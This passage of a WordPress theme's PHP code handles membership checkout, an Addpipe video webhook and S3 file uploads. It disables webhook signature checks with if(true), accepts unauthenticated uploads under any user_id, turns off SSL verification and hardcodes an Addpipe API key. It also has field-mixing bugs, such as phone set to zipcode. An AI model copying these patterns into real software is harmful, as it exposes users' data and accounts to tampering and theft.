                                                $morder->TrialBillingFrequency = $pmpro_level->cycle_number;
                                                $morder->TrialBillingCycles    = $pmpro_level->trial_limit;
                                                $morder->TrialAmount           = $pmpro_level->trial_amount;
                                        }

                                        //credit card values
                                        $morder->cardtype              = $CardType;
                                        $morder->accountnumber         = $AccountNumber;
                                        $morder->expirationmonth       = $ExpirationMonth;
                                        $morder->expirationyear        = $ExpirationYear;
                                        $morder->ExpirationDate        = $ExpirationMonth . $ExpirationYear;
                                        $morder->ExpirationDate_YdashM = $ExpirationYear . "-" . $ExpirationMonth;
                                        $morder->CVV2                  = $CVV;
										

                                        //not saving email in order table, but the sites need it
                                        $morder->Email = $bemail;

                                        //sometimes we need these split up
                                        $morder->FirstName = $bfirstname;
                                        $morder->LastName  = $blastname;
                                        $morder->Address1  = $baddress1;
                                        $morder->Address2  = $baddress2;
                                        
                                        $morder->AA_FirstName = $aa_firstname;
                                        $morder->AA_LastName  = $aa_lastname;
                                        $morder->AA_Address1  = $aa_address1;
                                        $morder->AA_city = $aa_city;
                                        $morder->AA_state = $aa_state;
                                        $morder->AA_zipcode = $aa_zipcode;
                                        $morder->AA_phone = $aa_zipcode;
                                        $morder->AA_email = $aa_emailaddress;
                                        $morder->AA_phonenumber = $aa_phonenumber;

                                        //other values
                                        $morder->billing          = new stdClass();
                                        $morder->billing->name    = $bfirstname . " " . $blastname;
                                        $morder->billing->street  = trim( $baddress1 . " " . $baddress2 );
                                        $morder->billing->city    = $bcity;
                                        $morder->billing->state   = $bstate;
                                        $morder->billing->country = $bcountry;
                                        $morder->billing->zip     = $bzipcode;
                                        $morder->billing->phone   = $bphone;
                                        

                                        //$gateway = ll_getOption("gateway");
                                        $morder->gateway = $gateway;
                                        $morder->setGateway();

                                        //setup level var
                                        $morder->getMembershipLevel();
                                        $morder->membership_level = apply_filters( "pmpro_checkout_level", $morder->membership_level );

                                        //tax
                                        $morder->subtotal = $morder->InitialPayment;
                                        $morder->getTax();

                                        //filter for order, since v1.8
                                        $morder = apply_filters( "pmpro_checkout_order", $morder );
                                        //$morder->stripeToken = $FORMPOST['stripeToken0'];
										
									// find the highest one still around, and use it - then remove it from $_REQUEST.
									$thetoken = "";
									$tokennum = -1;
									foreach($FORMPOST as $key => $param) {
										if(preg_match('/stripeToken(\d+)/', $key, $matches)) {
											if(intval($matches[1])>$tokennum) {
												$thetoken = sanitize_text_field($param);
												$tokennum = intval($matches[1]);
											}
										}
									}
									$morder->stripeToken = $thetoken;
									unset($FORMPOST['stripeToken'.$tokennum]);
			
                                        global $pmpro_stripe_lite, $current_user;
                                        if(!empty($pmpro_stripe_lite) && empty($morder->FirstName) && empty($morder->LastName))
                                        {
                                            if(!empty($current_user->ID))
                                            {
                                                $morder->FirstName = get_user_meta($current_user->ID, "first_name", true);
                                                $morder->LastName = get_user_meta($current_user->ID, "last_name", true);
                                            }
                                            elseif(!empty($FORMPOST['bfirstname']) && !empty($FORMPOST['blastname']))
                                            {
                                                $morder->FirstName = $FORMPOST['bfirstname'];
                                                $morder->LastName = $FORMPOST['blastname'];
                                            }
                                        }

                                        $pmpro_processed = $morder->process();

                                        if ( ! empty( $pmpro_processed ) ) {
                                            $pmpro_msg       = __( "Payment accepted.", "pmpro" );
                                            $pmpro_msgt      = "pmpro_success";
                                            $pmpro_confirmed = true;
                                        } else {
                                            $pmpro_msg = $morder->error;
                                            if ( empty( $pmpro_msg ) ) {
                                                    $pmpro_msg = __( "Unknown error generating account. Please contact us to set up your membership.", "pmpro" );
                                            
											}
                                            $pmpro_msgt = "pmpro_error";
                                        }

                                    } else // !$pmpro_requirebilling
                                    {
                                            //must have been a free membership, continue
                                            $pmpro_confirmed = true;
                                    }
                                }
                        }else{
                            echo json_encode( array('response' => 'false',  'message' => 'Username or Email Already exists') );
                            die(0);
                        }
                }    //endif ($pmpro_continue_registration)
				
        }

        //make sure we have at least an empty morder here to avoid a warning
        if ( empty( $morder ) ) {
                $morder = false;
        }


        //Hook to check payment confirmation or replace it. If we get an array back, pull the values (morder) out
        $pmpro_confirmed = apply_filters( 'pmpro_checkout_confirmed', $pmpro_confirmed, $morder );
		
        if ( is_array( $pmpro_confirmed ) ) {
            extract( $pmpro_confirmed );
        }

        //if payment was confirmed create/update the user.
        if ( ! empty( $pmpro_confirmed ) ) {
                //just in case this hasn't been set yet
                $submit = true;
				

                //do we need to create a user account?
                if ( ! $current_user->ID ) {
                        /*
                                create user
                        */
                        if ( version_compare( $wp_version, "3.1" ) < 0 ) {
                                require_once( ABSPATH . WPINC . '/registration.php' );
                        }    //need this for WP versions before 3.1

                        //first name
                        if ( ! empty( $FORMPOST['first_name'] ) ) {
                                $first_name = $FORMPOST['first_name'];
                        } else {
                                $first_name = $bfirstname;
                        }
                        //last name
                        if ( ! empty( $FORMPOST['last_name'] ) ) {
                                $last_name = $FORMPOST['last_name'];
                        } else {
                                $last_name = $blastname;
                        }

                        //insert user
                        $new_user_array = apply_filters( 'pmpro_checkout_new_user_array', array(
                                        "user_login" => $username,
                                        "user_pass"  => $password,
                                        "user_email" => $bemail
                                )
                        );

                        $user_id = apply_filters( 'pmpro_new_user', '', $new_user_array );
                        if ( empty( $user_id ) ) {
                                $user_id = wp_insert_user( $new_user_array );
                        }

                        if ( empty( $user_id ) || is_wp_error( $user_id ) ) {
                                $e_msg = '';

                                if ( is_wp_error( $user_id ) ) {
                                        $e_msg = $user_id->get_error_message();
                                }

                                if($user_level_id==4){
									$pmpro_msg  = __( "There was an error setting up your account.", "pmpro" ) . sprintf( " %s", $e_msg ); // Dirty 'don't break translation hack.
								}else{
									$pmpro_msg  = __( "Your payment was accepted, but there was an error setting up your account. Please contact us.", "pmpro" ) . sprintf( " %s", $e_msg ); // Dirty 'don't break translation hack.
								}
								
                                $pmpro_msgt = "pmpro_error";
                        } elseif ( apply_filters( 'pmpro_setup_new_user', true, $user_id, $new_user_array, $pmpro_level ) ) {

                                //check pmpro_wp_new_user_notification filter before sending the default WP email
                                // this is old notification
								/*if ( apply_filters( "pmpro_wp_new_user_notification", true, $user_id, $pmpro_level->id ) ) {
                                        if ( version_compare( $wp_version, "4.3.0" ) >= 0 ) {
                                                wp_new_user_notification( $user_id, null, 'both' );
                                        } else {
                                                wp_new_user_notification( $user_id, $new_user_array['user_pass'] );
                                        }
                                }*/
                                $wpuser = get_userdata( $user_id );

                                //make the user a subscriber
                                $wpuser->set_role( get_option( 'default_role', 'subscriber' ) );

                                //okay, log them in to WP
                                $creds                  = array();
                                $creds['user_login']    = $new_user_array['user_login'];
                                $creds['user_password'] = $new_user_array['user_pass'];
                                $creds['remember']      = true;
                                $user                   = wp_signon( $creds, false );

                               
							    //setting some cookies
                                wp_set_current_user( $user_id, $username );
                                wp_set_auth_cookie( $user_id, true, apply_filters( 'pmpro_checkout_signon_secure', force_ssl_admin() ) );
                        }
						// with new user email template notification
						send_user_welcome_email($user_id);
                } else {
                        $user_id = $current_user->ID;
                }

                if ( ! empty( $user_id ) && ! is_wp_error( $user_id ) ) {
//                        if(!empty(array_key_exists('employer', $user_data) && ! is_null($user_data['employer']))) {
                            update_user_meta($user_id, '_user_info', $user_data);
//                        }
                        do_action( 'pmpro_checkout_before_change_membership_level', $user_id, $morder );

                        //start date is NOW() but filterable below
                        $startdate = current_time( "mysql" );

                        /**
                         * Filter the start date for the membership/subscription.
                         *
                         * @since 1.8.9
                         *
                         * @param string $startdate , datetime formatsted for MySQL (NOW() or YYYY-MM-DD)
                         * @param int $user_id , ID of the user checking out
                         * @param object $pmpro_level , object of level being checked out for
                         */
                        $startdate = apply_filters( "pmpro_checkout_start_date", $startdate, $user_id, $pmpro_level );

                        //calculate the end date
                        if ( ! empty( $pmpro_level->expiration_number ) ) {
                                $enddate =  date_i18n( "Y-m-d", strtotime( "+ " . $pmpro_level->expiration_number . " " . $pmpro_level->expiration_period, current_time( "timestamp" ) ) );
                        } else {
                                $enddate = "NULL";
                        }

                        /**
                         * Filter the end date for the membership/subscription.
                         *
                         * @since 1.8.9
                         *
                         * @param string $enddate , datetime formatsted for MySQL (YYYY-MM-DD)
                         * @param int $user_id , ID of the user checking out
                         * @param object $pmpro_level , object of level being checked out for
                         * @param string $startdate , startdate calculated above
                         */
                        $enddate = apply_filters( "pmpro_checkout_end_date", $enddate, $user_id, $pmpro_level, $startdate );


                        $custom_level = array(
                            'user_id'         => $user_id,
                            'membership_id'   => $pmpro_level->id,
                            'code_id'         => $discount_code_id,
                            'initial_payment' => $pmpro_level->initial_payment,
                            'billing_amount'  => $pmpro_level->billing_amount,
                            'cycle_number'    => $pmpro_level->cycle_number,
                            'cycle_period'    => $pmpro_level->cycle_period,
                            'billing_limit'   => $pmpro_level->billing_limit,
                            'trial_amount'    => $pmpro_level->trial_amount,
                            'trial_limit'     => $pmpro_level->trial_limit,
                            'startdate'       => $startdate,
                            'enddate'         => $enddate
                        );
						
						// update user meta package storage
						$level_space = get_level_space_option_Value($user_level_id);
						update_user_meta( $user_id, 'user_allocated_space', $level_space);

                        if ( pmpro_changeMembershipLevel( $custom_level, $user_id, 'changed' ) ) {
                                //we're good
                                //blank order for free levels
                                if ( empty( $morder ) ) {
                                        $morder                 = new MemberOrder();
                                        $morder->InitialPayment = 0;
                                        $morder->Email          = $bemail;
                                        $morder->gateway        = "free";

                                        $morder = apply_filters( "pmpro_checkout_order_free", $morder );
                                }

                                //add an item to the history table, cancel old subscriptions
                                if ( ! empty( $morder ) ) {
                                        $morder->user_id       = $user_id;
                                        $morder->membership_id = $pmpro_level->id;
                                        $morder->saveOrder();
                                }

                                //update the current user
                                global $current_user;
                                if ( ! $current_user->ID && $user->ID ) {
                                        $current_user = $user;
                                } //in case the user just signed up
                                pmpro_set_current_user();



                                //save billing info ect, as user meta
                                $meta_keys   = array(
                                        "pmpro_bfirstname",
                                        "pmpro_blastname",
                                        "pmpro_baddress1",
                                        "pmpro_baddress2",
                                        "pmpro_bcity",
                                        "pmpro_bstate",
                                        "pmpro_bzipcode",
                                        "pmpro_bcountry",
                                        "pmpro_bphone",
                                        "pmpro_bemail",
                                        "pmpro_CardType",
                                        "pmpro_AccountNumber",
                                        "pmpro_ExpirationMonth",
                                        "pmpro_ExpirationYear"
                                );
                                $meta_values = array(
                                        $bfirstname,
                                        $blastname,
                                        $baddress1,
                                        $baddress2,
                                        $bcity,
                                        $bstate,
                                        $bzipcode,
                                        $bcountry,
                                        $bphone,
                                        $bemail,
                                        $CardType,
                                        hideCardNumber( $AccountNumber ),
                                        $ExpirationMonth,
                                        $ExpirationYear
                                );
                                pmpro_replaceUserMeta( $user_id, $meta_keys, $meta_values );

                                //save first and last name fields
                                if ( ! empty( $bfirstname ) ) {
                                        $old_firstname = get_user_meta( $user_id, "first_name", true );
                                        if ( empty( $old_firstname ) ) {
                                                update_user_meta( $user_id, "first_name", $bfirstname );
                                        }
                                }
                                if ( ! empty( $blastname ) ) {
                                        $old_lastname = get_user_meta( $user_id, "last_name", true );
                                        if ( empty( $old_lastname ) ) {
                                                update_user_meta( $user_id, "last_name", $blastname );
                                        }
                                }
                                //save administrator realted details
                                if ( !empty( $aa_firstname ) && isset($aa_firstname) ) {
                                        update_user_meta( $user_id, "pmpro_aa_firstname", $aa_firstname );
                                }
                                if ( !empty( $aa_lastname ) && isset($aa_lastname) ) {
                                        update_user_meta( $user_id, "pmpro_aa_lastname", $aa_lastname );
                                }
                                if ( !empty( $aa_address1 ) && isset($aa_address1) ) {
                                        update_user_meta( $user_id, "pmpro_aa_address1", $aa_address1 );
                                }
                                if ( !empty( $aa_city ) && isset($aa_city) ) {
                                        update_user_meta( $user_id, "pmpro_aa_city", $aa_city );
                                }
                                if ( !empty( $aa_state ) && isset($aa_state) ) {
                                        update_user_meta( $user_id, "pmpro_aa_state", $aa_state );
                                }
                                if ( !empty( $aa_city ) && isset($aa_city) ) {
                                        update_user_meta( $user_id, "pmpro_aa_city", $aa_city );
                                }
                                if ( !empty( $aa_zipcode ) && isset($aa_zipcode) ) {
                                        update_user_meta( $user_id, "pmpro_aa_zipcode", $aa_city );
                                }
                                if ( !empty( $aa_phonenumber ) && isset($aa_phonenumber) ) {
                                        update_user_meta( $user_id, "pmpro_aa_phonenumber", $aa_phonenumber );
                                }
                                if ( !empty( $aa_emailaddress ) && isset($aa_emailaddress) ) {
                                        update_user_meta( $user_id, "pmpro_aa_emailaddress", $aa_emailaddress );
                                }

                                //show the confirmation
                                $ordersaved = true;

                                //hook
                                do_action( "pmpro_after_checkout", $user_id, $morder );    //added $morder param in v2.0

                                $sendemails = apply_filters( "pmpro_send_checkout_emails", true);
                                
                                    if($sendemails) { // Send the e-mails only if the flag is set to true

                                            //setup some values for the emails
                                            if ( ! empty( $morder ) ) {
                                                    $invoice = new MemberOrder( $morder->id );
                                            } else {
                                                    $invoice = null;
                                            }
                                            $current_user->membership_level = $pmpro_level; //make sure they have the right level info

                                            //send email to member
                                            $pmproemail = new PMProEmail();
                                            $pmproemail->sendCheckoutEmail( $current_user, $invoice );

                                    }
                                $rurl = get_site_url().'/my-account';
                                echo json_encode( array('response' => 'true',  'redirect_url' => $rurl) );
                                die(0);
                        } else {

                            // test that the order object contains data
                            $test = (array) $morder;
                            if ( ! empty( $test ) && $morder->cancel() ) {
                                    $pmpro_msg = __( "IMPORTANT: Something went wrong during membership creation. Your credit card authorized, but we cancelled the order immediately. You should not try to submit this form again. Please contact the site owner to fix this issue.", "pmpro" );
                                    $morder    = null;
                            } else {
                                    $pmpro_msg = __( "IMPORTANT: Something went wrong during membership creation. Your credit card was charged, but we couldn't assign your membership. You should not submit this form again. Please contact the site owner to fix this issue.", "pmpro" );
                            }
                        }
                }
        }

        //default values
        if ( empty( $submit ) ) {
            //show message if the payment gateway is not setup yet
            if ( $pmpro_requirebilling && ! ll_getOption( "gateway", true ) ) {
                if ( pmpro_isAdmin() ) {
                    $pmpro_msg = sprintf( __( 'You must <a href="%s">set up a Payment Gateway</a> before any payments will be processed.', 'pmpro' ), get_admin_url( null, '/admin.php?page=pmpro-paymentsettings' ) );
                } else {
                    $pmpro_msg = __( "A Payment Gateway must be set up before any payments will be processed.", "pmpro" );
                }
                $pmpro_msgt = "";
            }

                //default values from DB
            if ( ! empty( $current_user->ID ) ) {
                $bfirstname    = get_user_meta( $current_user->ID, "pmpro_bfirstname", true );
                $blastname     = get_user_meta( $current_user->ID, "pmpro_blastname", true );
                $baddress1     = get_user_meta( $current_user->ID, "pmpro_baddress1", true );
                $baddress2     = get_user_meta( $current_user->ID, "pmpro_baddress2", true );
                $bcity         = get_user_meta( $current_user->ID, "pmpro_bcity", true );
                $bstate        = get_user_meta( $current_user->ID, "pmpro_bstate", true );
                $bzipcode      = get_user_meta( $current_user->ID, "pmpro_bzipcode", true );
                $bcountry      = get_user_meta( $current_user->ID, "pmpro_bcountry", true );
                $bphone        = get_user_meta( $current_user->ID, "pmpro_bphone", true );
                $bemail        = get_user_meta( $current_user->ID, "pmpro_bemail", true );
                $bconfirmemail = $bemail;    //as of 1.7.5, just setting to bemail
                $aa_firstname  = get_user_meta( $current_user->ID, "pmpro_aa_firstname", true );
                $aa_lastname   = get_user_meta( $current_user->ID, "pmpro_aa_lastname", true );
                $aa_address1   = get_user_meta( $current_user->ID, "pmpro_aa_address1", true );
                $aa_city       = get_user_meta( $current_user->ID, "pmpro_aa_city", true );
                $aa_state      = get_user_meta( $current_user->ID, "pmpro_aa_state", true );
                $aa_zipcode    = get_user_meta( $current_user->ID, "pmpro_aa_zipcode", true );
                $aa_country    = get_user_meta( $current_user->ID, "pmpro_aa_country", true );
                $aa_phonenumber = get_user_meta( $current_user->ID, "pmpro_aa_phonenumber", true );
                $aa_emailaddress = get_user_meta( $current_user->ID, "pmpro_aa_emailaddress", true );
                $CardType      = get_user_meta( $current_user->ID, "pmpro_CardType", true );
                //$AccountNumber = hideCardNumber(get_user_meta($current_user->ID, "pmpro_AccountNumber", true), false);
                $ExpirationMonth = get_user_meta( $current_user->ID, "pmpro_ExpirationMonth", true );
                $ExpirationYear  = get_user_meta( $current_user->ID, "pmpro_ExpirationYear", true );
            }
        }
		echo json_encode( array('response' => 'false',  'redirect_url' => '', 'message' => $pmpro_msg) );
        die(0);
    } else {
        echo json_encode( array('response' => 'false',  'redirect_url' => '', 'message' => $message) );
        die(0);
    }
	echo json_encode( array('response' => 'false',  'redirect_url' => '', 'message' => 'Unknown error occured') );
    die(0);
      
}
add_action('wp_ajax_nopriv_membership_form_submission', 'membership_form_submission_callback');
add_action('wp_ajax_membership_form_submission', 'membership_form_submission_callback');

// return by default in MB if true than in GB
function get_level_space_option_Value($user_level_id, $in_gb = false){
	$user_space = 0; 
	// check level ID
	if($user_level_id==1){
		$user_space = get_field('membership_leve_standard', 'option');
	}elseif($user_level_id==2){
		$user_space = get_field('membership_leve_eternal', 'option');
	}elseif($user_level_id==3){
		$user_space = get_field('membership_level_best_value', 'option');
	}elseif($user_level_id==4){
		$user_space = get_field('membership_level_free', 'option');
	}
	if($in_gb){
		return $user_space;
	}
	// convert into MB and than return it
	return ($user_space * 1000);
}

// return by default in MB if true than in GB
function get_level_additional_storage($user_level_id, $in_gb = false){
	$user_space = 0;
	$user_space = get_field('additional_storage', 'option');
	if($in_gb){
		return $user_space;
	}
	// convert into MB and than return it
	return ($user_space * 1000);
}

/**
 * Enqueue scripts and styles.
 */
function ll_enqueue_scripts() {
        wp_enqueue_script("stripe", "https://js.stripe.com/v2/", array(), NULL);

	wp_enqueue_script( 'twentyseventeen-global', get_theme_file_uri( '/includes/js/global.js' ), array( 'jquery', "stripe"), '1.0', true );
	wp_enqueue_script( 'fine-uploader', get_theme_file_uri( '/includes/js/fine-uploader.min.js' ), array('jquery'), NULL );
        
        wp_enqueue_style('fine uploader gallery', get_stylesheet_directory_uri() . '/includes/css/fine-uploader-gallery.min.css');

        $scriptData = array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce( "legacy_ajax_nonce" ),
            'loader' => get_theme_file_uri( 'images/loading.svg', __FILE__ )
        );
        wp_localize_script( 'twentyseventeen-global', 'script_parameter', $scriptData);
}
//add_action( 'wp_enqueue_scripts', 'll_enqueue_scripts' );


add_shortcode ('video-recorder', 'll_video_recorder');

function ll_video_recorder($atts = array()) {
	
	$param = shortcode_atts( array(
			'user_id' => '',
			'post_id' => '',
		), $atts );
	
	$user_id = get_current_user_id();
	if(!empty($param['user_id'])) // allow without login
	{
		$user_id  = $param['user_id'];
	}
	
    if (is_user_logged_in() || !empty($user_id)) {
        global $post;
		$post_id = !empty($param['post_id']) ? $param['post_id'] : $post->ID; 
        /*$toReturn = '<!-- begin video recorder code -->
<script type="text/javascript">
var size = {width:640,height:390};
var flashvars = {qualityurl: "avq/720p.xml",accountHash:"b1a5cc8b23852e8eb3602afcce71e52a", eid:1, showMenu:"true", mrt:120,sis:0,asv:1,mv:0, dpv:0, ao:0, dup:0, payload:\'{"by": "' . $user_id . '","bypid": "' . $post_id . '"}\'};
(function() {var pipe = document.createElement("script"); pipe.type = "text/javascript"; pipe.async = true;pipe.src = ("https:" == document.location.protocol ? "https://" : "http://") + "s1.addpipe.com/1.3/pipe.js";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(pipe, s);})();
</script>
<div id="hdfvr-content" ></div>
<!-- end video recorder code -->';*/
$toReturn = '
<!-- begin video recorder code -->
<script type="text/javascript">
var size = {width:640,height:390};
var flashvars = {qualityurl: "avq/720p.xml",accountHash:"b1a5cc8b23852e8eb3602afcce71e52a", eid:1, showMenu:"true", mrt:1200,sis:0,asv:1,mv:0, dpv:0, ao:0, dup:0, payload:\'{"by": "' . $user_id . '","bypid": "' . $post_id . '"}\'};
(function() {var pipe = document.createElement("script"); pipe.type = "text/javascript"; pipe.async = true;pipe.src = ("https:" == document.location.protocol ? "https://" : "http://") + "s1.addpipe.com/1.3/pipe.js";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(pipe, s);})();
</script>
<div id="hdfvr-content" ></div>
<!-- end video recorder code -->';
    }
    else {
        $toReturn = '<p>Please <a href="' . get_permalink( get_page_by_title( 'Login Page' )) . '">login</a> to record your video.</p>';
    }
    return $toReturn;
}

add_action('init', 'll_check_for_addpipe_webhook');
function ll_check_for_addpipe_webhook(){
    if($_REQUEST['addpipewebhook']== 'video-recorded'){
        $ll_addpipe_autheticate = false;
//        $ll_addpipe_url = 'https://livinglegacy.kinsta.com/?addpipewebhook=video-recorded'; 
//        $ll_addpipe_key = '5b0d4100c300a'; 
//        $ll_addpipe_signature = generateSignature($ll_addpipe_key,$ll_addpipe_url,$webhookData);
//        if ($webhookData["X-Pipe-Signature"] == $ll_addpipe_signature){
//            $ll_addpipe_autheticate = true;
//        }
        if(true){
//            update_option('ap_wh_debug_1', $_POST["payload"]);
            $webhookData = json_decode(stripslashes($_POST["payload"]), true);
//            update_option('ap_wh_debug_5', $webhookData);
//            update_option('ap_wh_debug_6', $webhookData["data"]);
//            update_option('ap_wh_debug_7', $webhookData["data"]["payload"]);
            $userinfo_payload = json_decode($webhookData["data"]["payload"], true);
            $user_id = intval($userinfo_payload["by"]);
            $bypid = intval($userinfo_payload["bypid"]);
//            update_option('ap_wh_debug_8', $user_id);
            $videoID = $webhookData["data"]["id"];
            $videodateTime = $webhookData["data"]["dateTime"];
            $videopayload = maybe_serialize($webhookData);
            global $wpdb;
            $addpipe_video_table_name = $wpdb->prefix . LL_ADDPIPE_VIDEO;
//            update_option('ap_wh_debug_2', $addpipe_video_table_name);
//            update_option('ap_wh_debug_3', array( 
//                            'user_id' => $user_id,
//                            'video_id' => $videoID,
//                            'video_recorded' => $videodateTime,
//                            'details' => $videopayload
//                            )
//                    );
            $insert_id = $wpdb->insert( 
                        $addpipe_video_table_name, 
                        array( 
                            'user_id' => $user_id,
                            'bypid' => $bypid,
                            'video_id' => $videoID,
                            'video_recorded' => $videodateTime,
                            'details' => $videopayload
                            )
                        );
//            update_option('ap_wh_debug_4', $insert_id);
                
        }
    }
    
}
/**
 * Generates a base64-encoded signature for a Pipe webhook request.
 * @param string $webhook_key the webhook's authentication key
 * @param string $url the webhook url
 * @param array $jsonData the data in JSON format received via $_POST["payload"].
 */
function generateSignature($webhook_key, $url, $jsonData) {

    $signed_data = $url;
    $signed_data .= $jsonData;

    return base64_encode(hash_hmac('sha1', $signed_data, $webhook_key, true));
}

function ll_get_addpipe_video_details($id){
    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => "https://api.addpipe.com/video/".$id,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => "",
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 30,
	  CURLOPT_SSL_VERIFYPEER=>false,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => "GET",
      CURLOPT_HTTPHEADER => array(
        "cache-control: no-cache",
        "x-pipe-auth: 680f32034f50f7906abaafe05e9129aff4777ab1b62a43a6067c60330cebaec8"
      ),
    ));

    $response = curl_exec($curl);
    $err = curl_error($curl);
	//echo '<pre>';
	//print_r($err);

    curl_close($curl);
    $ll_video_details = json_decode($response,true);
    
    return $ll_video_details;
}

    
add_shortcode ('file-uploader', 'll_fine_uploader');
function ll_fine_uploader($atts = array()){
	$param = shortcode_atts( array(
			'user_id' => '',
		), $atts );
	
	$user_id = '';
	if(!empty($param['user_id'])) // allow without login
	{
		$user_id  = $param['user_id'];
	}else{
		$user_id = get_current_user_id();
		
	}
	// logged in allow or only tributes share page allow
    if (is_user_logged_in() || !empty($user_id)) {
        $toReturn = '<!-- begin file uploader code -->
            <script type="text/template" id="qq-template">
        <div class="qq-uploader-selector qq-uploader qq-gallery" qq-drop-area-text="Drop files here">
            <div class="qq-total-progress-bar-container-selector qq-total-progress-bar-container">
                <div role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" class="qq-total-progress-bar-selector qq-progress-bar qq-total-progress-bar"></div>
            </div>
            <div class="qq-upload-drop-area-selector qq-upload-drop-area" qq-hide-dropzone>
                <span class="qq-upload-drop-area-text-selector"></span>
            </div>
            <div class="qq-upload-button-selector qq-upload-button">
                <div>Upload a file</div>
            </div>
            <span class="qq-drop-processing-selector qq-drop-processing">
                <span>Processing dropped files...</span>
                <span class="qq-drop-processing-spinner-selector qq-drop-processing-spinner"></span>
            </span>
            <ul class="qq-upload-list-selector qq-upload-list" role="region" aria-live="polite" aria-relevant="additions removals">
                <li>
                    <span role="status" class="qq-upload-status-text-selector qq-upload-status-text"></span>
                    <div class="qq-progress-bar-container-selector qq-progress-bar-container">
                        <div role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" class="qq-progress-bar-selector qq-progress-bar"></div>
                    </div>
                    <span class="qq-upload-spinner-selector qq-upload-spinner"></span>
                    <div class="qq-thumbnail-wrapper">
                        <img class="qq-thumbnail-selector" qq-max-size="120" qq-server-scale>
                    </div>
                    <button type="button" class="qq-upload-cancel-selector qq-upload-cancel">X</button>
                    <button type="button" class="qq-upload-retry-selector qq-upload-retry">
                        <span class="qq-btn qq-retry-icon" aria-label="Retry"></span>
                        Retry
                    </button>

                    <div class="qq-file-info">
                        <div class="qq-file-name">
                            <span class="qq-upload-file-selector qq-upload-file"></span>
                            <span class="qq-edit-filename-icon-selector qq-btn qq-edit-filename-icon" aria-label="Edit filename"></span>
                        </div>
                        <input class="qq-edit-filename-selector qq-edit-filename" tabindex="0" type="text">
                        <span class="qq-upload-size-selector qq-upload-size"></span>
                        <button type="button" class="qq-btn qq-upload-delete-selector qq-upload-delete">
                            <span class="qq-btn qq-delete-icon" aria-label="Delete"></span>
                        </button>
                        <button type="button" class="qq-btn qq-upload-pause-selector qq-upload-pause">
                            <span class="qq-btn qq-pause-icon" aria-label="Pause"></span>
                        </button>
                        <button type="button" class="qq-btn qq-upload-continue-selector qq-upload-continue">
                            <span class="qq-btn qq-continue-icon" aria-label="Continue"></span>
                        </button>
                    </div>
                </li>
            </ul>

            <dialog class="qq-alert-dialog-selector">
                <div class="qq-dialog-message-selector"></div>
                <div class="qq-dialog-buttons">
                    <button type="button" class="qq-cancel-button-selector">Close</button>
                </div>
            </dialog>

            <dialog class="qq-confirm-dialog-selector">
                <div class="qq-dialog-message-selector"></div>
                <div class="qq-dialog-buttons">
                    <button type="button" class="qq-cancel-button-selector">No</button>
                    <button type="button" class="qq-ok-button-selector">Yes</button>
                </div>
            </dialog>

            <dialog class="qq-prompt-dialog-selector">
                <div class="qq-dialog-message-selector"></div>
                <input type="text">
                <div class="qq-dialog-buttons">
                    <button type="button" class="qq-cancel-button-selector">Cancel</button>
                    <button type="button" class="qq-ok-button-selector">Ok</button>
                </div>
            </dialog>
        </div>
    </script>
    <div id="uploader"></div>
    <script>
	
        // Some options to pass to the uploader are discussed on the next page
        var uploader = new qq.FineUploader({
            element: document.getElementById("uploader"),
            request: {
                endpoint: "' . get_home_url() . '/?file_upload=true&user_id='.$user_id.'"
            },
            callbacks: {
                onComplete: function (id, name, responseJSON, xhr) {
                    llAddMedia(responseJSON);
					
					 setTimeout(function () {
						jQuery(".slick-prev").trigger("click");
					}, 2000);
									
					
                }
            }
        })
    </script>
    <!-- end fine uploader code -->';
    }
    else {
        $toReturn = '<p>Please <a href="' . get_permalink( get_page_by_title( 'Login Page' )) . '">login</a> to record your video.</p>';
    }
    return $toReturn;
}

add_action('init', 'll_handle_file_upload');

function ll_handle_file_upload () {
    if ($_GET['file_upload'] === 'true') {
        $uploadDetails = ll_upload_file_on_aws($_FILES['qqfile']);
//        var_dump($uploadDetails);
        $response = array('error' => 'Something went wrong. Please contact site administrator.');
        if ($uploadDetails['status'] === true)  {
            global $wpdb;
            $ll_files_table_name = $wpdb->prefix . LL_USER_MEDIA;
			$user_id = !empty($_GET['user_id']) ?  $_GET['user_id'] : get_current_user_id();
            $wpdb->insert( 
                    $ll_files_table_name, 
                    array(
                        'user_id' => $user_id, 
                        'filename' => $_FILES['qqfile']['name'],
                        'fileurl' => $uploadDetails['fileurl'],
                        'file_details' => $uploadDetails['response'] 
                    )
            );
            $fileID = $wpdb->insert_id;
            $response = array("success" => true, "id" => $fileID, "name" => $_FILES['qqfile']['name'], "url" => $uploadDetails['fileurl']);
        }
        echo json_encode($response);
        die;
    }
}

function ll_upload_file_on_aws($file) {
// USER OPTIONS
// Replace these values with ones appropriate to you.
    $accessKeyId = get_field('s3_access_key', 'option');
    $secretKey = get_field('s3_secret_key', 'option');
    $bucket = get_field('s3_bucket_name', 'option');
    $region = get_field('s3_region', 'option');
    $acl = 'public-read'; // private, public-read, etc
    $filePath = $file['tmp_name'];
	
	// new code to check image orientation	
	$exif = exif_read_data($filePath);
	//echo '<pre>';
	//print_r($exif);
	//die;
		if ( isset( $exif ) && isset( $exif['Orientation'] ) && $exif['Orientation'] > 1 ) {
			//echo 'EXIF::'.$exif['Orientation'];
			$imageResource = imagecreatefromjpeg($filePath); // provided that the image is jpeg. Use relevant function otherwise
			switch ($exif['Orientation']) {
				case 3:
				$newimg = imagerotate($imageResource, 180, 0);
				break;
				case 6:
				$newimg = imagerotate($imageResource, -90, 0);
				break;
				case 8:
				$newimg = imagerotate($imageResource, 90, 0);
				break;
				default:
				$newimg = $imageResource;
			} 
			 imagejpeg($newimg, $filePath);
		}

    $fileName = time() . $file['name'];
    $fileType = $file['type'];
//    var_dump($accessKeyId, $secretKey, $bucket, $region);
// VARIABLES
// These are used throughout the request.
    $longDate = gmdate('Ymd\THis\Z');
    $shortDate = gmdate('Ymd');
    $credential = $accessKeyId . '/' . $shortDate . '/' . $region . '/s3/aws4_request';

// POST POLICY
// Amazon requires a base64-encoded POST policy written in JSON.
// This tells Amazon what is acceptable for this request. For
